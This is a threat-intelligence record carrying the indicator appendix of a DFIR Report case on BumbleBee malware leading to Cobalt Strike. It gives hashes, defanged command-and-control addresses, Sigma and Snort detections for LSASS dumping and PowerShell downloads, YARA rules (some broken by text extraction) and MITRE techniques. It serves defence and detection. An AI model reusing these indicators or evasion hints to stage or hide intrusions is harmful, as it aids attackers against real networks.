f9e4fdf\n\na9e90587c54e68761be468181e56a5ba88bac10968ff7d8c0a1c01537158fbe8\n\nCommandLine.dll\n\n3654f4e4c0858a9388c383b1225b8384\n\n974ffbfae36e9a41ac672f9793ce1bee18f2e670\n\nfa2b74bfc9359efba61ed7625d20f9afc11a7933ebc9653e8e9b1e44be39c455\n\nw.bat\n\nbba3ff461eee305c7408e31e427f57e6\n\n3300c0c05b33691ecc04133885b7fc9513174746\n\n59198ffaf74b0e931a1cafe78e20ebf0b16f3a5a03bb4121230a0c44d7b963d2\n\ns.bat\n\n4b78228c08538208686b0f55353fa3bf\n\n67707f863aa405a9b9a335704808c604845394bf\n\n5eb0b0829b9fe344bff08de80f55a21a26a53df7bd230d777114d3e7b64abd24\n\n## Network\n\n```\n\n-----\n\n**BumbleBee**\n```\n142.91.3[.]109\n\n45.140.146[.]30\n\n```\n**Cobalt Strike**\n```\n45.153.243[.]142\n\nfuvataren[.]com\n\n108.62.12[.]174\n\ndofixifa[.]com\n\n```\n**Cobalt Strike Payload Hosting**\n```\n104.243.33[.]50\n\n## Detections\n\n Network\nET POLICY OpenSSL Demo CA - Internet Widgits Pty (O)\n\nET POLICY SMB Executable File Transfer\n\nET RPC DCERPC SVCCTL - Remote Service Control Manager Access\n\nET POLICY SMB2 NT Create AndX Request For an Executable File\n\nET POLICY SSL/TLS Certificate Observed (AnyDesk Remote Desktop Software)\n\nET USER_AGENTS AnyDesk Remote Desktop Software User-Agent\n(Snort VRT) MALWARE-OTHER CobaltStrike powershell web delivery attempt\n\n Sigma\n\n```\n[https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/win_network_anydesk.yml](https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/win_network_anydesk.yml)\nhttps://github.com/The-DFIR-Report/SigmaRules/blob/main/win_cobaltstrike_operator_bloopers_cmds.yml\n[https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/adfind_discovery](https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/adfind_discovery)\nhttps://github.com/SigmaHQ/sigma/blob/04f72b9e78f196544f8f1331b4d9158df34d7ecf/rules/\nwindows/builtin/security/win_iso_mount.yml\nhttps://github.com/SigmaHQ/sigma/blob/d459483ef6bb889fb8da1baa17a713a4f1aa8897/rul\nes/windows/file_event/file_event_win_iso_file_recent.yml\n\nhttps://github.com/SigmaHQ/sigma/blob/8bb3379b6807610d61d29db1d76f5af4840b8208/rul\nes/windows/process_creation/proc_creation_win_rundll32_not_from_c_drive.yml\n\nhttps://github.com/SigmaHQ/sigma/blob/7f490d958aa7010f7f519e29bed4a45ecebd152e/rul\nes/windows/process_creation/proc_creation_win_susp_powershell_enc_cmd.yml\n\n\n-----\n\nhttps://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creati\non_win_process_dump_rundll32_comsvcs.yml\n\nhttps://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creati\non_win_susp_rundll32_no_params.yml\nhttps://github.com/NVISOsecurity/sigmapublic/blob/master/rules/windows/sysmon/sysmon_lsass_memdump.yml\nhttps://github.com/SigmaHQ/sigma/blob/master/rules/windows/pipe_created/pipe_created_m\nal_cobaltstrike.yml\nhttps://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creati\non_win_nltest_recon.yml\nhttps://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creati\non_win_susp_whoami.yml\nhttps://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creati\non_win_susp_net_execution.yml\nhttps://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creati\non_win_susp_adfind.yml\nhttps://github.com/SigmaHQ/sigma/blob/54d141eb585f38fc83a1dc15aa281a84c0416d4f/rule\ns-deprecated/windows/powershell_suspicious_download.yml\nhttps://github.com/SigmaHQ/sigma/blob/b24e7ae9846f53cbbf61adad72f17af317c860a4/rule\ns/windows/process_creation/proc_creation_win_susp_powershell_iex_patterns.yml\nhttps://github.com/SigmaHQ/sigma/blob/04f72b9e78f196544f8f1331b4d9158df34d7ecf/rules/\nwindows/builtin/system/win_cobaltstrike_service_installs.yml\nhttps://github.com/SigmaHQ/sigma/blob/e10fa684bdd0254b5ba5102feae293b8564f4628/rul\nes/windows/powershell/powershell_script/posh_ps_powerview_malicious_commandlets.yml\nhttps://github.com/SigmaHQ/sigma/blob/40adb0339e8e4b5286fc46e05b96e7b48e967e0c/rul\nes/windows/process_creation/proc_creation_win_susp_recon_activity.yml\nhttps://github.com/SigmaHQ/sigma/blob/58f1d6fa2c679198f2932e3c361d5fa827effa95/rules/\nnetwork/zeek/zeek_susp_kerberos_rc4.yml\nhttps://github.com/SigmaHQ/sigma/blob/f4ef4fcdc4eb780bcaa59f6756bffa5b0fbacd20/rules/\nwindows/builtin/security/win_susp_rc4_kerberos.yml\nhttps://github.com/SigmaHQ/sigma/blob/8bb3379b6807610d61d29db1d76f5af4840b8208/rul\nes/windows/process_creation/proc_creation_win_susp_procdump.yml\nhttps://github.com/SigmaHQ/sigma/blob/33b370d49bd6aed85bd23827aa16a50bd06d691a/r\nules/windows/process_creation/proc_creation_win_anydesk.yml\n\n## Yara\n\n\n-----\n\n```\n/\nYARA Rule Set\n\nAuthor: The DFIR Report\n\nDate: 2022-08-08\n\nIdentifier: BumbleBee Case 13387\n\nReference: https://thedfirreport.com\n\n*/\n\n/* Rule Set ----------------------------------------------------------------- */\n\nrule bumblebee_13387_VulnRecon_dll {\n\n  meta:\n\n   description = \"BumbleBee - file VulnRecon.dll\"\n\n   author = \"TheDFIRReport\"\n\n   reference = \"https://thedfirreport.com\"\n\n   date = \"2022-08-08\"\n\n   hash1 = \"a9e90587c54e68761be468181e56a5ba88bac10968ff7d8c0a1c01537158fbe8\"\n  strings:\n\n   $x1 = \"Use VulnRecon.exe -i, --SystemInfo to execute this command\" fullword\nwide\n\n   $x2 = \"Use VulnRecon.exe -v, --Vulnerability to execute this command\"\nfullword wide\n\n   $x3 = \"Use VulnRecon.exe -h, --HotFixes to execute this command\" fullword\nwide\n\n   $x4 = \"Use VulnRecon.exe -m, --MicrosoftUpdates to execute this command\"\nfullword wide\n\n   $x5 = \"Use VulnRecon.exe  -s, --SupportedCve to execute this command\"\nfullword wide\n\n   $s6 = \"VulnRecon.dll\" fullword wide\n\n   $s7 = \"VulnRecon.Commands.SystemCommands\" fullword ascii\n\n   $s8 = \"VulnRecon.Commands.CveCommands\" fullword ascii\n\n   $s9 = \"VulnRecon.Commands\" fullword ascii\n\n   $s10 = \"VulnRecon.CommandLine\" fullword ascii\n\n   $s11 =\n\"D:\\\\work\\\\rt\\\\VulnRecon\\\\VulnRecon\\\\obj\\\\Release\\\\net5.0\\\\VulnRecon.pdb\" fullword\nascii\n\n   $s12 = \"VulnRecon.Commands.ToolsCommand\" fullword ascii\n\n   $s13 = \"Using VulnRecon.exe -o or VulnRecon.exe --OptionName\" fullword wide\n\n   $s14 = \"commandVersion\" fullword ascii\n\n   $s15 = \"GetSystemInfoCommand\" fullword ascii\n\n   $s16 = \"CreateGetSupportedCveCommand\" fullword ascii\n\n   $s17 = \"CreateWindowsVersionCommand\" fullword ascii\n\n   $s18 = \"    <requestedExecutionLevel level=\\\"asInvoker\\\"\nuiAccess=\\\"false\\\"/>\" fullword ascii\n\n   $s19 = \"get_CommandVersion\" fullword ascii\n\n   $s20 = \"<CommandVersion>k__BackingField\" fullword ascii\n\n  condition:\n\n   uint16(0) == 0x5a4d and filesize < 50KB and\n\n   1 of ($x*) and 4 of them\n\n}\n\n```\n\n-----\n\n```\nrule bumblebee_13387_VulnRecon_exe {\n\n  meta:\n\n   description = \"BumbleBee - file VulnRecon.exe\"\n\n   author = \"TheDFIRReport\"\n\n   reference = \"https://thedfirreport.com\"\n\n   date = \"2022-08-08\"\n\n   hash1 = \"eb4cba90938df28f6d8524be639ed7bd572217f550ef753b2f2d39271faddaef\"\n  strings:\n\n   $s1 = \"hostfxr.dll\" fullword wide\n\n   $s2 = \"--- Invoked %s [version: %s, commit hash: %s] main = {\" fullword wide\n\n   $s3 = \"This executable is not bound to a managed DLL to execute. The binding\nvalue is: '%s'\" fullword wide\n\n   $s4 = \"D:\\\\a\\\\_work\\\\1\\\\s\\\\artifacts\\\\obj\\\\winx64.Release\\\\corehost\\\\cli\\\\apphost\\\\standalone\\\\Release\\\\apphost.pdb\" fullword ascii\n\n   $s5 = \"VulnRecon.dll\" fullword wide\n\n   $s6 = \"api-ms-win-crt-runtime-l1-1-0.dll\" fullword ascii\n\n   $s7 = \" - %s&apphost_version=%s\" fullword wide\n\n   $s8 = \"api-ms-win-crt-convert-l1-1-0.dll\" fullword ascii\n\n   $s9 = \"api-ms-win-crt-math-l1-1-0.dll\" fullword ascii\n\n   $s10 = \"api-ms-win-crt-time-l1-1-0.dll\" fullword ascii\n\n   $s11 = \"api-ms-win-crt-stdio-l1-1-0.dll\" fullword ascii\n\n   $s12 = \"api-ms-win-crt-heap-l1-1-0.dll\" fullword ascii\n\n   $s13 = \"api-ms-win-crt-string-l1-1-0.dll\" fullword ascii\n\n   $s14 = \"The managed DLL bound to this executable is: '%s'\" fullword wide\n\n   $s15 = \"A fatal error was encountered. This executable was not bound to load a\nmanaged DLL.\" fullword wide\n\n   $s16 = \"api-ms-win-crt-locale-l1-1-0.dll\" fullword ascii\n\n   $s17 = \"Showing error dialog for application: '%s' - error code: 0x%x - url:\n'%s'\" fullword wide\n\n   $s18 = \"Failed to resolve full path of the current executable [%s]\" fullword\nwide\n\n   $s19 = \"https://go.microsoft.com/fwlink/?linkid=798306\" fullword wide\n\n   $s20 = \"The managed DLL bound to this executable could not be retrieved from\nthe executable image.\" fullword wide\n\n  condition:\n\n   uint16(0) == 0x5a4d and filesize < 400KB and\n\n   all of them\n\n}\n\n\nrule bumblebee_13387_wab {\n\n  meta:\n\n   description = \"BumbleBee - file wab.exe\"\n\n   author = \"TheDFIRReport\"\n\n   reference = \"https://thedfirreport.com\"\n\n   date = \"2022-08-08\"\n\n   hash1 = \"1cf28902be615c721596a249ca85f479984ad85dc4b19a7ba96147e307e06381\"\n  strings:\n\n   $s1 = \"possibility terminate nation inch ducked ski accidentally usage absent\nreader rowing looking smack happily strings disadvantage \" ascii\n\n```\n\n-----\n\n```\n   $s2 pfxvex450gd81.exe fullword ascii\n\n   $s3 = \"31403272414143\" ascii /* hex encoded string '[email protected]' */\n\n   $s4 = \"s wolf save detail surgery short vigour uttered fake proposal moustache\naccustomed lock been vegetable maximum ownership specifi\" ascii\n\n   $s5 = \"130 Dial password %d propose7177! Syllable( warrior stretching Angry 83)\nsabotage %s\" fullword wide\n\n   $s6 = \"possibility terminate nation inch ducked ski accidentally usage absent\nreader rowing looking smack happily strings disadvantage \" ascii\n\n   $s7 = \"accomplish course Content 506) arched organ Travels\" fullword ascii\n   $s8 = \"123 serve edit. 693 [email protected] mercy \" fullword wide\n\n   $s9 = \"Top wealthy! fish 760? pier%complaint July nicer! 587) %s shark+ \"\nfullword wide\n\n   $s10 = \" Approximate- Choked- %s %s, \" fullword wide\n\n   $s11 = \"niece beacon dwelling- Headlong Intellectual+\" fullword ascii\n\n   $s12 = \">Certainty holes) cherries Proceeding Active+ surname Rex/ gets\"\nfullword wide\n\n   $s13 = \"[email protected] Couple? %s, shy %d %d) plume \" fullword wide\n\n   $s14 = \" again workroom front leader height mantle mother sudden illness\ndiscontent who finest southern nature supplement normally hopef\" ascii\n\n   $s15 = \"Advantage %s+ Creation. officially/ Affirmative %s? %s \" fullword ascii\n\n   $s16 = \"[email protected] falcon+ illumination repair/ %s! \" fullword ascii\n\n   $s17 = \"%Truthful- %d/ 161! Checking 786/ Mob \" fullword wide\n\n   $s18 = \"#%s. %s Door observed- lazy? [email protected] \" fullword wide\n\n   $s19 = \"wrong comer? %s) Designer$ 372\" fullword wide\n\n   $s20 = \"Fleet( %d, lads. %d! %d %s 445\" fullword wide\n\n  condition:\n\n   uint16(0) == 0x5a4d and filesize < 200KB and\n\n   8 of the\n\n## MITRE\n\n```\nPhishing – T1566\n\nMalicious File – T1204.002\n\nWindows Command Shell – T1059.003\n\nPowerShell – T1059.001\n\nProcess Injection – T1055\n\nFile Deletion – T1070.004\n\nLSASS Memory – T1003.001\n\nKerberoasting – T1558.003\n\nDomain Account – T1087.002\nDomain Trust Discovery – T1482\n\nLateral Tool Transfer – T1570\n\nRemote Desktop Protocol – T1021.001\n\nValid Accounts – T1078\n\nRemote Access Software – T1219\n\nIngress Tool Transfer – T1105\n\nWeb Protocols – T1071.001\n\nSystem Services – T1569\n\n\n-----\n\nSMB/Windows Admin Shares – T1021.002\nSoftware Discovery – T1518\n\nSystem Network Configuration Discovery – T1016\n\nRemote System Discovery – T1018\n\nProcess Discovery – T1057\n\nMark-of-the-Web Bypass – T1553.005\n\nMasquerading – T1036\n\nRundll32 – T1218.011\n\nDomain Groups – T1069.002\nWindows Management Instrumentation – T1047\n\nPassword Guessing – T1110.001\n\nInternal case #13387\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-08-08 - BumbleBee Roasts Its Way to Domain Admin.pdf"
    ],
    "report_names": [
        "2022-08-08 - BumbleBee Roasts Its Way to Domain Admin.pdf"
    ],
    "threat_actors": [
        {
            "id": "a2d3f35f-3b29-4509-bff5-af2638140d39",
            "created_at": "2022-10-25T16:07:23.633982Z",
            "updated_at": "2025-03-27T02:02:09.898653Z",
            "deleted_at": null,
            "main_name": "FIN12",
            "aliases": [],
            "source_name": "ETDA:FIN12",
            "tools": [
                "Agentemis",
                "BEERBOT",
                "BazarBackdoor",
                "BazarCall",
                "BazarLoader",
                "Cobalt Strike",
                "CobaltStrike",
                "KEGTAP",
                "TSPY_TRICKLOAD",
                "Team9Backdoor",
                "The Trick",
                "TheTrick",
                "Totbrick",
                "TrickBot",
                "TrickLoader",
                "bazaloader",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "4594f985-865e-4862-8047-2e80226e246a",
            "created_at": "2022-10-27T08:27:12.984825Z",
            "updated_at": "2025-03-27T02:00:55.424827Z",
            "deleted_at": null,
            "main_name": "EXOTIC LILY",
            "aliases": [
                "EXOTIC LILY"
            ],
            "source_name": "MITRE:EXOTIC LILY",
            "tools": [
                "Bazar"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "63061658-5810-4f01-9620-7eada7e9ae2e",
            "created_at": "2022-10-25T15:50:23.752974Z",
            "updated_at": "2025-03-27T02:00:55.538582Z",
            "deleted_at": null,
            "main_name": "Wizard Spider",
            "aliases": [
                "Wizard Spider",
                "UNC1878",
                "TEMP.MixMaster",
                "Grim Spider",
                "FIN12",
                "GOLD BLACKBURN",
                "ITG23",
                "Periwinkle Tempest",
                "DEV-0193"
            ],
            "source_name": "MITRE:Wizard Spider",
            "tools": [
                "TrickBot",
                "AdFind",
                "BITSAdmin",
                "Bazar",
                "LaZagne",
                "Nltest",
                "GrimAgent",
                "Dyre",
                "Ryuk",
                "Conti",
                "Emotet",
                "Rubeus",
                "Mimikatz",
                "Diavol",
                "PsExec",
                "Cobalt Strike"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f6f91e1c-9202-4497-bf22-9cd5ef477600",
            "created_at": "2023-01-06T13:46:38.86765Z",
            "updated_at": "2025-03-27T02:00:02.938998Z",
            "deleted_at": null,
            "main_name": "WIZARD SPIDER",
            "aliases": [
                "FIN12",
                "UNC2053",
                "Pistachio Tempest",
                "TEMP.MixMaster",
                "GOLD BLACKBURN",
                "Periwinkle Tempest",
                "DEV-0193",
                "Storm-0193",
                "Trickbot LLC",
                "DEV-0237"
            ],
            "source_name": "MISPGALAXY:WIZARD SPIDER",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e6a21528-2999-4e2e-aaf4-8b6af14e17f3",
            "created_at": "2022-10-25T16:07:24.422115Z",
            "updated_at": "2025-03-27T02:02:10.216817Z",
            "deleted_at": null,
            "main_name": "Wizard Spider",
            "aliases": [
                "DEV-0193",
                "Gold Blackburn",
                "Gold Ulrick",
                "Grim Spider",
                "ITG23",
                "Operation BazaFlix",
                "Periwinkle Tempest",
                "TEMP.MixMaster",
                "Wizard Spider"
            ],
            "source_name": "ETDA:Wizard Spider",
            "tools": [
                "AdFind",
                "Agentemis",
                "Anchor_DNS",
                "BEERBOT",
                "BazarBackdoor",
                "BazarCall",
                "BazarLoader",
                "Cobalt Strike",
                "CobaltStrike",
                "Conti",
                "Diavol",
                "Dyranges",
                "Dyre",
                "Dyreza",
                "Dyzap",
                "Gophe",
                "Invoke-SMBAutoBrute",
                "KEGTAP",
                "LaZagne",
                "LightBot",
                "PowerSploit",
                "PowerTrick",
                "PsExec",
                "Ryuk",
                "SessionGopher",
                "TSPY_TRICKLOAD",
                "Team9Backdoor",
                "The Trick",
                "TheTrick",
                "Totbrick",
                "TrickBot",
                "TrickLoader",
                "TrickMo",
                "Upatre",
                "bazaloader",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bc119938-a79c-4e5f-9d4d-dc96835dfe2e",
            "created_at": "2024-06-04T02:03:07.799286Z",
            "updated_at": "2025-03-27T02:05:17.337094Z",
            "deleted_at": null,
            "main_name": "GOLD BLACKBURN",
            "aliases": [
                "Periwinkle Tempest ",
                "Wizard Spider ",
                "ITG23 "
            ],
            "source_name": "Secureworks:GOLD BLACKBURN",
            "tools": [
                " Buer Loader",
                " Dyre",
                " Team9",
                " TrickBot",
                "BazarLoader"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "56384d06-abc2-4853-8440-db4d7b7d1b5f",
            "created_at": "2023-01-06T13:46:39.367122Z",
            "updated_at": "2025-03-27T02:00:03.064071Z",
            "deleted_at": null,
            "main_name": "EXOTIC LILY",
            "aliases": [
                "DEV-0413"
            ],
            "source_name": "MISPGALAXY:EXOTIC LILY",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536150,
    "ts_updated_at": 1743041820,
    "ts_creation_date": 1660795023,
    "ts_modification_date": 1660795023,
    "files": {
        "pdf": "https://archive.orkl.eu/edb1350fc65cfa13177f5dfa5fd1bee11f4738c4.pdf",
        "text": "https://archive.orkl.eu/edb1350fc65cfa13177f5dfa5fd1bee11f4738c4.txt",
        "img": "https://archive.orkl.eu/edb1350fc65cfa13177f5dfa5fd1bee11f4738c4.jpg"
    }
}